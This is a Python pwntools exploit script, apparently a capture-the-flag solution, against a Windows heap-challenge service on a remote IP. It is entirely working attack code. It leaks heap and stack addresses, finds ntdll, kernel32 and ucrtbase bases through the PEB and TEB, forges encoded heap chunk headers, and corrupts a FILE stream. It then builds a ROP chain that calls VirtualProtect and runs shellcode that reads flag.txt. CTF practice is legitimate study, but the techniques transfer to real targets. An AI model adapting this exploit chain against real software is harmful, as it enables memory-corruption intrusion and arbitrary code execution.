from pwn import *

#r = remote("192.168.1.134", 4869)
r = remote("13.230.51.176", 4869)
r.sendlineafter(">>","1")
r.sendlineafter(":","orange")
r.sendlineafter(":","godlike")
def alloc(key,size,data):
    r.sendlineafter(">>","1")
    r.sendlineafter(":",key)
    r.sendlineafter(":",str(size))
    r.sendlineafter(":",data)

def show(key):
    r.sendlineafter(">>","2")
    r.sendlineafter(":",key)

def remove(key):
    r.sendlineafter(">>","3")
    r.sendlineafter(":",key)
def logout():
    r.sendlineafter(">>","4")




alloc("a",0x100,"a")
alloc("a",0x10,"a")
alloc("b",0x30,"a")
show("a")
r.recvuntil(":")
predata = r.recvn(0x20)
heap = u64(r.recvn(8))-0x960 
print hex(heap)
def read(addr):
    alloc("a",0x10,predata+p64(addr)+p64(0x8)+"b")
    show("b")
    r.recvuntil(":")
    val = u64(r.recvn(8))
    return val

preldr = read(heap+0x2c0)-0x1d10+0x033a0
peb = read(preldr-0x3a0+0x2e8)-0x240
teb = peb+0x1000
stack = read(teb+0x8)-0x8
print hex(preldr)
print hex(peb)
print hex(teb)




print hex(stack)
img = read(preldr+0x20)
code = read(img+0x20)
img = read(img)
ntdll = read(img+0x20)
img = read(img)
kernel = read(img+0x20)
img = read(read(img))
uart = read(img+0x20)
File = read(code+0x5668)
encode = read(heap+0x88)
Heap = read(code+0x5640)
print hex(code)
print hex(ntdll)
print hex(kernel)
print hex(uart)
print hex(File)
print hex(encode)


while read(stack)!= code+0x1e38:
    stack-=0x10
stack -= 0x410
print hex(stack)

alloc("c",0x300,"a")
alloc("c",0x10,"a")
alloc("d",0x10,"a")
alloc("e",0x10,"a")
alloc("f",0x10,"a")

alloc("d",0x20,"a")
alloc("e",0x20,"a")

context.arch = "amd64"
payload = flat("\x00"*0x88,0x702000002^encode,heap+0xc40,code+0x5630,"\x00"*(0xb28-0xab0),0x702000002^encode,code+0x5630,heap+0x150)
print hex(len(payload))
alloc("c",0x10,payload+"z"*0x8+asm("""
mov rax,{}
mov rcx,0xFFFFFFF6
call rax
mov rcx,rax
mov rdx,{}
mov r8,0x300
lea r9,[rsp+0x10]
push 0
mov rax,{}
call rax
mov rax,{}
jmp rax
""".format(kernel+0x1C890,heap,kernel+0x22680,heap)))

logout()
r.sendlineafter(">>","1")
r.sendlineafter(":","ddaa".ljust(8,'\x00')+flat(0x702000002^encode,heap+0xaa0,heap+0xb30)[:-1])
r.sendlineafter(":","phdphd")
alloc("0",0x10,"a")
alloc("1",0x100,"a")
filestream = flat(
stack,stack,p32(0),p32(0x2041),0,0x200,0,"\xff"*0xc,0,0,p32(0),heap,heap,p32(0),p32(0x2041),0,0x200,0,"\xff"*0xc
)
alloc("1",0x10,"cmd".ljust(0x10,"\x00")+p64(Heap)+"a"*0x20+p64(code+0x5670)+filestream)

logout()
r.sendlineafter(">>","1")
r.sendlineafter(":","flag.txt\x00r\x00")
r.sendafter(":","phdphd".ljust(0x20,"a"))

payload = flat(ntdll+0x8fb30,0x1000,heap,0x40,code+0x56f0,0,0,kernel+0x1B680,
heap+0xb48
)
r.send(payload.ljust(0x200,"\x00"))





shellcode = asm(shellcraft.pushstr("flag.txt"))+\
asm("mov rdx,rsp")+asm("""
push 0x72
mov rcx,{}
mov r8,rsp
mov rax,{}
push 0
push 0
call rax
mov rcx,{}
mov rdx,0x100
mov r9,{}
mov r9,[r9]
mov r8,1
push 0
mov rax,{}
call rax
mov rcx,{}
mov rax,{}
call rax
""".format(code+0x5640,uart+0x071770,heap+0x1000,code+0x5640,uart+0x181C0,heap+0x1000,uart+0x80760))


r.send(shellcode)


r.interactive()
